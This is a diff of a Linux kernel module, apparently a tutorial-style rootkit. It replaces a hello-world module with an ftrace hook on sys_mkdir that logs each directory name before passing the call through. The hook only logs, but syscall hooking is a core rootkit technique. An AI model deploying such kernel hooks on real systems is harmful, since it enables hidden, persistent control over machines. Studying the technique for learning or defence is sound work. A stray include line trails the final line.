@@ -17,51 +17,58 @@ MODULE_VERSION("0.01");
 #endif
 
 #ifdef PTREGS_SYSCALL_STUBS
-/*
- * What is `asmlinkage`?*/
 static asmlinkage long (*orig_mkdir)(const struct pt_regs *);
 
-asmlinkage int hook_mkdir(const struct pt_regs *regs) {
-  char __user *pathname = (char *)regs->di;
-  char dir_name[NAME_MAX] = { 0 };
+asmlinkage int hook_mkdir(const struct pt_regs *regs)
+{
+    char __user *pathname = (char *)regs->di;
+    char dir_name[NAME_MAX] = {0};
 
-  long error = strncpy_from_user(dir_name, pathname, NAME_MAX);
+    long error = strncpy_from_user(dir_name, pathname, NAME_MAX);
 
-  if (error > 0)
-      printk(KERN_INFO "[!] Rootkit: Trying to create directory w/ name: %s\n", dir_name);
+    if (error > 0)
+        printk(KERN_INFO "rootkit: trying to create directory with name: %s\n", dir_name);
 
-  orig_mkdir(regs);
-  return 0;
+    orig_mkdir(regs);
+    return 0;
 }
 #else
 static asmlinkage long (*orig_mkdir)(const char __user *pathname, umode_t mode);
 
-asmlinkage int hook_mkdir(const char __user *pathname, umode_t mode) {
-  char dir_name[NAME_MAX] = { 0 };
-  
-  long error = strncpy_from_user(dir_name, pathname, NAME_MAX);
+asmlinkage int hook_mkdir(const char __user *pathname, umode_t mode)
+{
+    char dir_name[NAME_MAX] = {0};
 
-  if (error > 0)
-      printk("[!] Rootkit: Trying to create directory w/ name %s\n", dir_name);
+    long error = strncpy_from_user(dir_name, pathname, NAME_MAX);
 
-  orig_mkdir(pathname, mode);
-  return 0;
+    if (error > 0)
+        printk(KERN_INFO "rootkit: trying to create directory with name %s\n", dir_name);
+
+    orig_mkdir(pathname, mode);
+    return 0;
 }
 #endif
 
-static int __init example_init(void) {
-    // Print string to kernel buffer
-    // see message w/ dmesg. You always start w/
-    // KERN_* macro which defines log level
-    printk(KERN_INFO "Hello, world!\n");
+static struct ftrace_hook hooks[] = {
+    HOOK("sys_mkdir", hook_mkdir, &orig_mkdir),
+};
+
+static int __init rootkit_init(void)
+{
+    int err;
+    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
+    if(err)
+        return err;
+
+    printk(KERN_INFO "rootkit: loaded\n");
     return 0;
 }
 
-static void __exit example_exit(void) {
-    printk(KERN_INFO "Goodbye, world!\n");
+static void __exit rootkit_exit(void)
+{
+    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
+    printk(KERN_INFO "rootkit: unloaded\n");
 }
 
-// This declares to the compiler the roles
-// of the following functions
-module_init(example_init);
-module_exit(example_exit);
+module_init(rootkit_init);
+module_exit(rootkit_exit);#include <linux/init.h>
